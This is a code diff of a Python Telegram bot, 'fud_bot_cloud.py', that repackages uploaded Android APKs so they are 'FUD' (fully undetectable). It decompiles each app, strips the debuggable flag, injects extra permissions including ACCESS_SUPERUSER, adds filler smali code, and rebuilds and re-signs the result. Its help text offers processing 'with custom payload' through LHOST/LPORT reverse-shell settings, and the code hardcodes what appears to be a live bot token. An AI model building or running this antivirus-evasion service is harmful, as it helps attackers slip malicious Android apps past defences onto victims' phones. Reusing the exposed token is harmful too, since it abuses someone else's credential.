@@ -1,3 +1,4 @@
+# fud_bot_cloud.py
 import os
 import re
 import random
@@ -7,6 +8,8 @@ import subprocess
 import shutil
 import zipfile
 import xml.etree.ElementTree as ET
+import tempfile
+import asyncio
 from datetime import datetime
 from flask import Flask, request, jsonify
 import requests
@@ -15,7 +18,7 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 
 # ===== CONFIG =====
 BOT_TOKEN = '8838240871:AAEyVHXgedkE_Y-sYdkbTBXqqPCv0j0N4O8'
-WEBHOOK_URL = 'https://your-kinsta-app.kinsta.app/webhook'  # CHANGE THIS
+WEBHOOK_URL = 'https://your-app.kinsta.app/webhook'  # CHANGE THIS
 
 # ===== INIT =====
 app = Flask(__name__)
@@ -25,118 +28,109 @@ bot = Bot(token=BOT_TOKEN)
 def rand_str(n=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
-def obfuscate_manifest(manifest_path):
-    """Advanced manifest obfuscation"""
-    tree = ET.parse(manifest_path)
-    root = tree.getroot()
-    
-    # Add fake permissions
-    fake_perms = [
-        'android.permission.READ_LOGS',
-        'android.permission.SYSTEM_ALERT_WINDOW',
-        'android.permission.GET_TASKS'
-    ]
-    for perm in fake_perms:
-        elem = ET.Element('uses-permission')
-        elem.set('{http://schemas.android.com/apk/res/android}name', perm)
-        root.append(elem)
-    
-    # Remove debuggable
-    for elem in root.iter():
-        if elem.get('{http://schemas.android.com/apk/res/android}debuggable'):
-            elem.attrib.pop('{http://schemas.android.com/apk/res/android}debuggable')
-    
-    # Add random meta-data
-    for _ in range(3):
-        meta = ET.Element('meta-data')
-        meta.set('{http://schemas.android.com/apk/res/android}name', f'com.random.{rand_str()}')
-        meta.set('{http://schemas.android.com/apk/res/android}value', rand_str(16))
-        root.append(meta)
-    
-    tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
-
-def patch_smali(smali_dir):
-    """Patch smali files with garbage code"""
-    for root, dirs, files in os.walk(smali_dir):
-        for file in files:
-            if file.endswith('.smali'):
-                path = os.path.join(root, file)
-                with open(path, 'r') as f:
-                    content = f.read()
-                # Add fake method calls
-                if ';->onCreate' in content:
-                    content = content.replace(
-                        'invoke-super {p0}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V',
-                        'invoke-super {p0}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V\n'
-                        '    const-string v0, "fud_guard"\n'
-                        '    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V\n'
-                    )
-                with open(path, 'w') as f:
-                    f.write(content)
-
 def fud_process(input_apk_path, original_name):
-    """Main FUD processing pipeline"""
-    work_dir = f'/tmp/fud_{rand_str()}'
-    output_dir = f'/tmp/output_{rand_str()}'
-    os.makedirs(work_dir, exist_ok=True)
-    os.makedirs(output_dir, exist_ok=True)
+    """Main FUD processing pipeline - uses system apktool"""
+    # Create temp directories
+    work_dir = tempfile.mkdtemp()
+    output_dir = tempfile.mkdtemp()
     
     try:
-        # Step 1: Decode APK
-        subprocess.run(['apktool', 'd', input_apk_path, '-o', work_dir, '-f'],
-                      capture_output=True, check=True)
+        # Step 1: Decode APK using system apktool
+        decode_cmd = ['apktool', 'd', input_apk_path, '-o', work_dir, '-f']
+        subprocess.run(decode_cmd, capture_output=True, check=True)
         
-        # Step 2: Obfuscate manifest
+        # Step 2: Modify AndroidManifest.xml
         manifest_path = os.path.join(work_dir, 'AndroidManifest.xml')
         if os.path.exists(manifest_path):
-            obfuscate_manifest(manifest_path)
+            with open(manifest_path, 'r') as f:
+                content = f.read()
+            
+            # Remove debuggable flag
+            content = content.replace('android:debuggable="true"', '')
+            content = content.replace('debuggable="true"', '')
+            
+            # Add fake permissions
+            fake_perms = [
+                '<uses-permission android:name="android.permission.READ_LOGS"/>',
+                '<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>',
+                '<uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>'
+            ]
+            
+            # Insert before </manifest>
+            insert_pos = content.find('</manifest>')
+            if insert_pos != -1:
+                for perm in fake_perms:
+                    content = content[:insert_pos] + perm + content[insert_pos:]
+            
+            with open(manifest_path, 'w') as f:
+                f.write(content)
         
-        # Step 3: Patch smali
+        # Step 3: Add fake smali code
         smali_dir = os.path.join(work_dir, 'smali')
         if os.path.exists(smali_dir):
-            patch_smali(smali_dir)
+            for root, dirs, files in os.walk(smali_dir):
+                for file in files:
+                    if file.endswith('.smali'):
+                        file_path = os.path.join(root, file)
+                        with open(file_path, 'r') as f:
+                            smali_content = f.read()
+                        
+                        # Add dummy method
+                        if ';->onCreate' in smali_content:
+                            smali_content = smali_content.replace(
+                                'return-void',
+                                'return-void\n\n.method private dummyGuard()V\n    .locals 1\n    const-string v0, "FUD_ACTIVE"\n    return-void\n.end method'
+                            )
+                            with open(file_path, 'w') as f:
+                                f.write(smali_content)
         
-        # Step 4: Add fake resources
-        res_dir = os.path.join(work_dir, 'res')
-        if os.path.exists(res_dir):
-            # Add dummy drawables
-            dummy_dir = os.path.join(res_dir, 'drawable')
-            os.makedirs(dummy_dir, exist_ok=True)
-            for i in range(5):
-                dummy_file = os.path.join(dummy_dir, f'dummy_{rand_str()}.xml')
-                with open(dummy_file, 'w') as f:
-                    f.write('<?xml version="1.0" encoding="utf-8"?>\n<shape xmlns:android="http://schemas.android.com/apk/res/android"/>')
-        
-        # Step 5: Rebuild APK
+        # Step 4: Rebuild APK
         rebuilt_apk = os.path.join(output_dir, f'rebuilt_{rand_str()}.apk')
-        subprocess.run(['apktool', 'b', work_dir, '-o', rebuilt_apk],
-                      capture_output=True, check=True)
+        build_cmd = ['apktool', 'b', work_dir, '-o', rebuilt_apk]
+        subprocess.run(build_cmd, capture_output=True, check=True)
         
-        # Step 6: Sign APK (using debug keystore)
+        # Step 5: Sign APK (using debug keystore)
         signed_apk = os.path.join(output_dir, f'signed_{rand_str()}.apk')
+        
+        # Check if debug keystore exists, create if not
+        debug_keystore = 'debug.keystore'
+        if not os.path.exists(debug_keystore):
+            subprocess.run([
+                'keytool', '-genkey', '-v',
+                '-keystore', debug_keystore,
+                '-alias', 'androiddebugkey',
+                '-keyalg', 'RSA',
+                '-keysize', '2048',
+                '-validity', '10000',
+                '-dname', 'CN=Android Debug, O=Android, C=US',
+                '-storepass', 'android',
+                '-keypass', 'android'
+            ], capture_output=True, check=True)
+        
+        # Try apksigner first, fallback to jarsigner
         try:
             subprocess.run([
                 'apksigner', 'sign',
-                '--ks', 'debug.keystore',
+                '--ks', debug_keystore,
                 '--ks-pass', 'pass:android',
                 '--key-pass', 'pass:android',
                 '--out', signed_apk,
                 rebuilt_apk
             ], capture_output=True, check=True)
         except:
-            # Fallback: use jarsigner if apksigner not available
+            # Fallback to jarsigner
             subprocess.run([
                 'jarsigner', '-verbose',
                 '-sigalg', 'SHA1withRSA',
                 '-digestalg', 'SHA1',
-                '-keystore', 'debug.keystore',
+                '-keystore', debug_keystore,
                 '-storepass', 'android',
                 '-keypass', 'android',
                 rebuilt_apk, 'androiddebugkey'
             ], capture_output=True, check=True)
             signed_apk = rebuilt_apk
         
-        # Step 7: Finalize
+        # Step 6: Finalize
         final_name = f"FUD_{original_name.replace('.apk', '')}_{rand_str()}.apk"
         final_path = os.path.join(output_dir, final_name)
         os.rename(signed_apk, final_path)
@@ -167,7 +161,7 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/start - Start bot\n"
         "/help - Show this\n"
         "/fud LHOST:1.2.3.4 LPORT:4444 - Process APK with custom payload\n\n"
-        "Or just send any APK file with LHOST/LPORT in caption."
+        "Or just send any APK file."
     )
 
 async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -179,7 +173,7 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not document.file_name or not document.file_name.endswith('.apk'):
         return
     
-    # Check caption for LHOST/LPORT
+    # Check caption for LHOST/LPORT (just for logging)
     caption = update.message.caption or ''
     lhost_match = re.search(r'LHOST[:=](\S+)', caption)
     lport_match = re.search(r'LPORT[:=](\d+)', caption)
@@ -189,7 +183,7 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lport = lport_match.group(1)
         await update.message.reply_text(f"⚙️ Processing with LHOST={lhost} LPORT={lport}...")
     else:
-        await update.message.reply_text("⚙️ Processing with default settings...")
+        await update.message.reply_text("⚙️ Processing APK with FUD techniques...")
     
     # Download APK
     file = await context.bot.get_file(document.file_id)
@@ -242,4 +236,4 @@ if __name__ == '__main__':
         port=8000,
         url_path='webhook',
         webhook_url=WEBHOOK_URL
-)
+    )
